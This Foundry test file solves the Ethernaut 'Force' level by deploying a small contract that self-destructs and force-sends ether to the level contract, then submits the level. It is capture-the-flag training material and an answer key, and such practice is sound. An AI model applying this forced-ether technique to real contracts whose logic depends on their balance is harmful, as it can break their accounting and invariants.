// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {ForceFactory} from "../src/levels/07-ForceFactory.sol";
import {Force} from "../src/levels/07-Force.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract Emo {
    constructor()payable{} // solhint-disable no-empty-blocks
    function kms(address payable beneficiary) public {
        selfdestruct(beneficiary);
    }
}

contract ForceSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    ForceFactory internal factory;

    function solution(Force target) internal virtual {
        Emo emo = new Emo{value: 1}();
        emo.kms(payable(address(target)));
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new ForceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Force delegationContract = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(delegationContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
